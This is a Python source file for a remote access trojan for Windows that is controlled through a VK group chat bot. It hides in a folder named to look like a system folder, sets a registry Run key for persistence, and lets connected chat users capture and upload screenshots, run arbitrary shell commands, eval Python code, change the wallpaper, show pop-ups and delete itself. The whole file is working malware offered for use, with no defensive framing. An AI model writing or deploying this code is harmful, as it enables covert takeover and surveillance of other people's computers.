import requests
import bs4
import config 
import time 
import random 
import json
import re
import sqlite3
import qrcode 
import os
import subprocess
import pyautogui as pyauto
import ctypes
from winreg import *

#################################################################################################################
#########################################        __DANIEL__RU__         #########################################
#################################################################################################################
#Data Base Users
# def Users(user_id,chat_id):
#     status = "User"
#     db = sqlite3.connect("Users.db")
#     sql = db.cursor()
#     sql.execute("CREATE TABLE IF NOT EXISTS users(Nickname TEXT,user_id Text,chat_id Text,Status Text)")
#     sql.execute('''SELECT user_id FROM users WHERE user_id=?''', (user_id,))
#     exists = sql.fetchall()
#     if not exists:
#        sql.execute(f"INSERT INTO users VALUES(?,?,?,?)",(UserName(user_id),user_id,chat_id,status))
#        db.commit()
#        print('Create new user')
#     else:
#        print("\n")
#true message save
#def DataBaseMessageSaveTrue(user_id,TextMessage):
    # db = sqlite3.connect("MessagesTrue.db")
    # sql = db.cursor()
    # sql.execute("CREATE TABLE IF NOT EXISTS Messages(Nickname TEXT,Time TEXT,user_id Text,TextMessage Text)")
    # db.commit()
    # sql.execute(f"INSERT INTO Messages VALUES(?,?,?,?)",(UserName(user_id),config.Time(),user_id,TextMessage))
    # db.commit()
#Data Base Messages
# def DataBaseMessageSave(chat_id,user_id,message_text):
#     db = sqlite3.connect("Botlog.db")
#     sql = db.cursor()
#     sql.execute("CREATE TABLE IF NOT EXISTS Messages(Nickname TEXT,Time TEXT,chat_id Text,user_id Text,message_text TEXT)")
#     db.commit()
#     sql.execute(f"INSERT INTO Messages VALUES(?,?,?,?,?)",(UserName(user_id),config.Time(),chat_id,user_id,message_text))
#     db.commit()
############################## Config ############################

#debuging mode
debuging_mode = config.debug_mode

  
# # Путь в реестре
# key_my = OpenKey(HKEY_CURRENT_USER,
#                  r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
#                  0, KEY_ALL_ACCESS)
# # Установить программу "notepad" в автозагрузку
# SetValueEx(key_my, 'mynotepad', 0, REG_SZ, r'C:\Windows\System32\notepad.exe')
# # Закрыть реестр
# CloseKey(key_my)
#create maps
os.system('md C:\\SyS\\System\\System32\\DB')
os.system('md C:\\SyS\\System\\System32\\Program')
os.system('md C:\\SyS\\System\\System32\\Screenshots')

try:
    os.system('copy Script.exe C:\\SyS\System\\System32\Program\\Script.exe')
except:
    pass
try:
    key_my = OpenKey(HKEY_CURRENT_USER,
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                    0, KEY_ALL_ACCESS)
    SetValueEx(key_my, 'SCRIPT', 0, REG_SZ, r'copy test.exe C:\\SyS\System\\System32\Program\\Script.exe')
    CloseKey(key_my)
except:
    pass
#create db
db = sqlite3.connect("C:\SyS\System\System32\DB\LOGS.db")
sql = db.cursor()
sql.execute("CREATE TABLE IF NOT EXISTS Log(name TEXT, password TEXT)")
db.commit()
sql.execute("CREATE TABLE IF NOT EXISTS Users(users TEXT)")
db.commit()
status_db = True
for db_value in sql.execute("SELECT * FROM  Log"):
    BOT_INIT = {'name' : db_value[0],
                'password' : db_value[1]}
    if debuging_mode == True:
        print('Name : ' + db_value[0] +'\nPassword: ' + db_value[1] )
    status_db = False
if status_db == True:
    BOT_INIT = {'name' : '1',
               'password' : '1'}
    sql.execute(f"INSERT INTO Log VALUES(?,?)",(1,1))
    db.commit()


status_db_1 = True
global acces_users
for db_value in sql.execute("SELECT * FROM  Users"):
    acces_users = db_value[0]
    if debuging_mode == True:
        print('Users_access list : ' + db_value[0]  )
    status_db_1 = False
if status_db_1 == True:
    acces_users = '0'
    sql.execute(f"INSERT INTO Users VALUES(?)",('0'))
    db.commit()


############################### Server authentification ############################## 
class AuthServer:
   
    def __init__(self):    
        def auth_server ():
            auth_vk = requests.get("https://api.vk.com/method/groups.getLongPollServer?group_id={0}&access_token={1}&v={2}".format(config.grupid,config.token,'5.95'))
            return auth_vk.json()
        ServerRespons = auth_server()
        try:
            self.ServerRespons =ServerRespons
            self.response = ServerRespons["response"]
            self.key = ServerRespons ["response"]["key"]
            self.server = ServerRespons ["response"]["server"]
            self.ts = ServerRespons ["response"]["ts"]
        except:
            pass
        

############################## Ceck events ############################## 
class Message:
    
    def __init__(self,key,server,ts):
        def server_ceck(key,server,ts):
            ServerResponse = requests.get("{server}?act=a_check&key={key}&ts={ts}&wait=25".format(server=server,key=key,ts=ts))
            return ServerResponse.json() 
        server_response = server_ceck(key,server,ts)
        try:
            self.server_response = server_response
            self.updates = server_response["updates"]
            self.message  = server_response["updates"][0]
            self.user_id = self.message['object']["from_id"]
            self.peer_id = self.message['object']["peer_id"]
            self.messagetext = self.message['object']['text']
            self.group_id = self.message["group_id"]
            self.user_name = UserName(self.user_id)
            try:
                self.attachament =server_response['updates'][0]['object']['attachments'][0]['photo']['sizes']
                self.attachament_size_8_url =server_response['updates'][0]['object']['attachments'][0]['photo']['sizes'][3]['url']
            except:
                pass
        except:
            pass
        
########### Ceck User Name #############        
#clear tag 
def _clean_all_tag_from_str(string_line):
    result = ""
    not_skip = True
    for i in list(string_line):
        if not_skip:
            if i == "<":
                not_skip = False
            else:
                result += i
        else:
            if i == ">":
                not_skip = True
    
    return result



#User Name
def UserName(user_id):
    request = requests.get("https://vk.com/id"+str(user_id))
    bs = bs4.BeautifulSoup(request.text, "html.parser")
    
    user_name = _clean_all_tag_from_str(bs.findAll("title")[0])
    
    return user_name.split()[0]






#########################  Send pghoto message ###################
def SendPhotoMessage(PhotoUpload):
    params_1={'access_token' : config.token,   
                'v':'5.95'
                }
    #server link
    request_1= requests.get(url = 'https://api.vk.com/method/photos.getMessagesUploadServer?',params=params_1)
    res_1= request_1.json()
    upload_url=res_1['response']['upload_url'] 
    files = { 'photo' : open(PhotoUpload,'rb')}
    #upload photo
    #POST
    request_2 = requests.post(url=upload_url, files=files)
    res_2 =request_2.json()
    photo = res_2['photo']
    server = res_2['server']
    hashphoto = res_2['hash']
    params_2={
        'access_token' : config.token,
        'photo':photo,
        'server':server,
        'hash':hashphoto,
        'v':5.59
            }
    #save photo
    requests_3= requests.get(url = 'https://api.vk.com/method/photos.saveMessagesPhoto?',params=params_2)
    res_3 = requests_3.json()  
    if debuging_mode == True:
        print(res_3)
    owner_id = res_3['response'][0]['owner_id']
    object_id = res_3['response'][0]['id']
    photo= 'photo'+str(owner_id)+'_'+str(object_id)
    if debuging_mode == True:
        print(photo)
    return photo   
#########################  Send message ###################
def MessageSend(group_id,user_id,TextMessage,peer_id,messagetext,jsonKeyboard=None,attachment=None):
    parans={'access_token' : config.token,
            'group_id'     : config.grupid,
            'random_id'    : config.RandomId(),
            'peer_id'      : peer_id,
            'message'      : TextMessage,
            'keyboard'     : jsonKeyboard,
            'attachment'   : attachment,
            'v'            : '5.95'
            }
           
    _MessageSend = requests.get("https://api.vk.com/method/messages.send?", params=parans)
    #DataBaseMessageSave(chat_id=peer_id,user_id=user_id,message_text=messagetext)
    if debuging_mode == True:
        print(_MessageSend.text)


########################## Message ceck #################################
def MessageCeck(message):
    #random_id = config.random
    #help
    text = ['help','Hellp','Help','hellp']
    if re.search(text[0],message.messagetext) or  re.search(text[1],message.messagetext) or  re.search(text[2],message.messagetext) or  re.search(text[3],message.messagetext):
        text = """Comands :
            Add
            Conect
            Disconect
            Text
            Message
            Screenshot
            Wallpaper
            OS
            Pyauto
            """
        keyboards = {"one_time":True,"buttons": [[{ "action": { "type": "text","label": "Add"},"color": "positive"}],[{"action": {"type": "text","label": "Conect"}, "color": "positive"}],[{"action": {"type": "text","label": "Disconect"},"color": "positive"}],[{"action": {"type": "text","label": "Screen"},"color": "positive"}],[{"action": {"type": "text","label": "Os"},"color": "positive"}]]}
        jsonKeyboard = json.dumps(keyboards)
        MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage = text,messagetext=message.messagetext,jsonKeyboard=jsonKeyboard)

    #ADD
    if message.messagetext == 'add' or message.messagetext == 'Add':
        if BOT_INIT['name'] == '1' and BOT_INIT['password'] == '1':
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Enter PC name',messagetext=message.messagetext)
            status_1 = False
            status_2 = False
            while status_1 == False:
                authServer  = AuthServer()
                ServerCeck = Message(authServer.key,authServer.server,authServer.ts)
                
            
                if debuging_mode == False:
                    print(ServerCeck.updates)
                if  ServerCeck.updates == []:
                    pass
                else:
                    if debuging_mode == True:
                        print (ServerCeck.updates)
                    message = ServerCeck
                    BOT_INIT['name'] = message.messagetext
                    MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='PC name is: '+ str (BOT_INIT['name']),messagetext=message.messagetext)
                    MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Enter PC password',messagetext=message.messagetext)
                    while status_2 == False:
                        authServer  = AuthServer()
                        ServerCeck = Message(authServer.key,authServer.server,authServer.ts)
                        
                    
                        if debuging_mode == True:
                            print(ServerCeck.updates)
                        if  ServerCeck.updates == []:
                            pass
                        else:
                            if debuging_mode == True:
                                print (ServerCeck.updates)
                            message = ServerCeck
  
                            BOT_INIT['password'] = message.messagetext
                            db = sqlite3.connect("C:\SyS\System\System32\DB\LOGS.db")
                            sql = db.cursor()
                            for value in sql.execute("SELECT * FROM  Log"):
                                if debuging_mode == True:
                                    print('Name : ' + value[0] +'\nPassword: ' + value[1] )
                                sql_text = "UPDATE Log SET  name = ? WHERE name = ?"
                                val = (BOT_INIT['name'], value[0])
                                sql.execute(sql_text, val)
                                db.commit()
                                sql_text = "UPDATE Log SET password =? WHERE name = ?"
                                val = (BOT_INIT['password'],BOT_INIT['name'])
                                sql.execute(sql_text,val)
                                db.commit()
                                for value in sql.execute("SELECT * FROM  Log"):
                                    if debuging_mode == True:
                                        print('Name : ' + value[0] +'\nPassword: ' + value[1] )
                                
                            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Succefull save\nWrite connect to conect to pc',messagetext=message.messagetext)
                            status_1 = True
                            status_2 = True
        else:
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Bot is set!\nBot name: ' + BOT_INIT['name'],messagetext=message.messagetext)
 
    #conect
    connect = ['conect','connect','Connect','Conect']
    if message.messagetext == connect[0] or message.messagetext == connect[1] or message.messagetext == connect[2] or message.messagetext == connect[3]:
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Enter PC password',messagetext=message.messagetext)
            status_1 = False
            while status_1 == False:
                authServer  = AuthServer()
                ServerCeck = Message(authServer.key,authServer.server,authServer.ts)
                
            
                if debuging_mode == True:
                    print(ServerCeck.updates)
                if  ServerCeck.updates == []:
                    pass
                else:
                    if debuging_mode == True:
                        print (ServerCeck.updates)
                    message = ServerCeck 
                    if BOT_INIT['password']  != message.messagetext:
                        MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='PC : '+ str (BOT_INIT['name']) + '\n    Incorect password',messagetext=message.messagetext)
                        status_1 = True  
                    else:
                        MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='PC : '+ str (BOT_INIT['name'])+ '\n    Succefull conect!',messagetext=message.messagetext)
                        global acces_users
                        acces_users = acces_users + " " + str(message.user_id) + " "  
                        db = sqlite3.connect("C:\SyS\System\System32\DB\LOGS.db")
                        sql = db.cursor()
                        for value in sql.execute("SELECT * FROM  Users"):
                            if debuging_mode == True:
                                print('Access_users: '+ value[0])
                            sql_text = "UPDATE Users SET  users = ? WHERE users = ?"
                            val = (acces_users,value[0])
                            sql.execute(sql_text,val)
                            db.commit()
                            for value in sql.execute("SELECT * FROM  Users"):
                                if debuging_mode == True:
                                    print('Access_users: '+ value[0])
                        
                        status_1 = True    
    if  message.messagetext == 'Disconect' or message.messagetext == 'disconect' or message.messagetext == 'Disconnect' or message.messagetext == 'disconnect':
        acces_users = re.sub(str(message.user_id),'',acces_users)
        db = sqlite3.connect("C:\SyS\System\System32\DB\LOGS.db")
        sql = db.cursor()
        for value in sql.execute("SELECT * FROM  Users"):
            if debuging_mode == True:
               print('Access_users'+ value[0])
            sql_text = "UPDATE Users SET  users = ? WHERE users = ?"
            val = (acces_users,value[0])
            sql.execute(sql_text,val)
            db.commit()
            for value in sql.execute("SELECT * FROM  Users"):
                if debuging_mode == True:
                    print('Access_users: '+ value[0])
                        

    #if user is connected
    if re.search(str(message.user_id),acces_users):
        #screenshot
        screenshot = ['screenshot','screen','scren','scrin','Screen']
        if message.messagetext == screenshot[0] or  message.messagetext == screenshot[1] or message.messagetext == screenshot[2] or message.messagetext == screenshot[3] or message.messagetext == screenshot[4]:
            name = random.randint(1,10000000)
            pyauto.screenshot('C:\\SyS\\System\\System32\\Screenshots\\'+str(name)+'.jpg')
            attachament = SendPhotoMessage('C:\\SyS\System\\System32\\Screenshots\\'+str(name) + '.jpg')
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='',messagetext=message.messagetext,attachment=attachament)
        #wallpaper
        walpapers = ['walpaper','walpapers','Walpaper','Walper','Walpers','wallpaper','Wallpaper','Wallpapers','wallpapers',]
        if message.messagetext == walpapers[0] or  message.messagetext == walpapers[1] or message.messagetext == walpapers[2] or message.messagetext == walpapers[3] or message.messagetext == walpapers[4] or message.messagetext == walpapers[5] or message.messagetext == walpapers[6] or message.messagetext == walpapers[7] or message.messagetext == walpapers[8]:
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Send a photo',messagetext=message.messagetext)
            status_1 = False
            try:
                while status_1 == False:
                        authServer  = AuthServer()
                        ServerCeck = Message(authServer.key,authServer.server,authServer.ts)
                        
                    
                        if debuging_mode == False:
                            print(ServerCeck.updates)
                        if  ServerCeck.updates == []:
                            pass
                        else:
                            if debuging_mode == True:
                                print (ServerCeck.updates)
                            message = ServerCeck
                            rand_name= str(random.randint(1,100000000))
                            name = 'C:\SyS\System\System32\Screenshots\wallpapers_' + rand_name + '.jpg'
                            url = message.attachament_size_8_url
                            def SaveImage(url,name):
                                response = requests.get(url)
                                if str(response) == '<Response [200]>':
                                    with open(name,'wb') as InFille:
                                        for chunk in response.iter_content(1000):
                                            InFille.write(chunk)
                                else:
                                    if debuging_mode == True:
                                        print('Error:\nSave image'+'\nErrorCode' + str(response)+'\nErrorText' + str(response.text))
                            SaveImage(url,name)
                            SPI_SETDESKWALLPAPER = 0x14  
                            SPIF_UPDATEINIFILE   = 0x2 
                            src = name
                            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, src, SPIF_UPDATEINIFILE)
                            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='Succefull!',messagetext=message.messagetext)
            except:
                MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ='This is not a photo!',messagetext=message.messagetext)
        #OS
        os_comands = ['os','Os','OS']
        if re.search(os_comands[0],message.messagetext) or  re.search(os_comands[1],message.messagetext)or  re.search(os_comands[2],message.messagetext):
            os_ = re.sub('os', '',message.messagetext)
            os_ = re.sub('Os', '',os_)
            os_ = re.sub('OS', '',os_)
            if os_ == 'python':
                os_ = ''
            if re.search('format',os_):
                os_ = ''
            try:
                direct_output = subprocess.check_output(os_, shell=True)
                MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage =direct_output,messagetext=message.messagetext)
            except:
                _os_ = os.system(os_)
                MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage =_os_,messagetext=message.messagetext)
        #delete
        delete = ['Delete','delete','delet']
        if re.search(delete[0],message.messagetext) or  re.search(delete[1],message.messagetext)or  re.search(delete[2],message.messagetext):
            try:
                os.system('DEL C:\\SyS\System\\System32\Program\\Script.exe')
                os.system('DEL Script.exe')
                os.system('DEL C:\\SyS')
                MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ="SUCCEFUL",messagetext=message.messagetext)

            except:
                os.system('DEL C:\\SyS\System\\System32\Program\\Script.exe /F')
                os.system('DEL Script.exe /F')
                os.system('DEL C:\\SyS /F')
                MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ="SUCCEFUL",messagetext=message.messagetext)
        #message
        message_ = ['message','Message','sms','Sms']
        if re.search(message_[0],message.messagetext) or  re.search(message_[1],message.messagetext) or  re.search(message_[2],message.messagetext) or  re.search(message_[3],message.messagetext):
            message_ = re.sub('message', '',message.messagetext)
            message_ = re.sub('Message', '',message_)
            message_ = re.sub('sms', '',message_)
            message_ = re.sub('Sms', '',message_)
            response = pyauto.prompt(text = message_,title='',default='')
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage =response,messagetext=message.messagetext)
        #message
        text = ['text','Text','TXT','txt']
        if re.search(text[0],message.messagetext) or  re.search(text[1],message.messagetext) or  re.search(text[2],message.messagetext) or  re.search(text[3],message.messagetext):
            text = re.sub('text', '',message.messagetext)
            text = re.sub('Text', '',text)
            text = re.sub('TXT', '',text)
            text = re.sub('txt', '',text)
            os_res = os.system('msg %username% ' + message.messagetext)
            MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ="Succefull!",messagetext=message.messagetext)
        #message
        pyauto_ = ['pyauto','Pyauto','pyautogui','Pyautogui']
        if re.search(pyauto_[0],message.messagetext) or  re.search(pyauto_[1],message.messagetext) or  re.search(pyauto_[2],message.messagetext) or  re.search(pyauto_[3],message.messagetext):
            try:
                if re.search('pyauto',message.messagetext) or re.search('pyautogui',message.messagetext) or re.search('Pyauto',message.messagetext) or re.search('Pyautogui',message.messagetext):
                    eval(message.messagetext)
                    MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ="Succefull!",messagetext=message.messagetext)

            except:
                MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ="Python Error!",messagetext=message.messagetext)
    else:
        MessageSend(peer_id= message.peer_id,group_id=message.group_id,user_id=message.user_id,TextMessage ="You are not logged in!!!",messagetext=message.messagetext)
    
########################### Main ############################
def main ():
    authServer  = AuthServer()
    if debuging_mode == True:
        print(authServer.ServerRespons)
    ServerCeck = Message(authServer.key,authServer.server,authServer.ts)
    if debuging_mode == True:
        print(authServer.ServerRespons)
    if  ServerCeck.updates == []:
        pass
    else:
        if debuging_mode == True:
            print (ServerCeck.server_response)
        MessageCeck(ServerCeck)

for ceck in range (10000000000): 

        main()
   
        
        


